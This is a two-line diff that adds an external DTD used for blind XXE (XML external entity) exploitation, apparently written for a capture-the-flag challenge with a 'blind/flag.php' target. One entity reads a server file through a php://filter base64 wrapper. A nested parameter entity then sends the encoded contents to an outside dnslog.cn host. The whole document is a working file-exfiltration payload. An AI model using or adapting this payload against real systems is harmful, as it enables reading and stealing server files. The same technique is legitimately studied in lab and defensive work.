@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/blind/flag.php">
+<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://rrte4n.dnslog.cn?p=%file;'>">
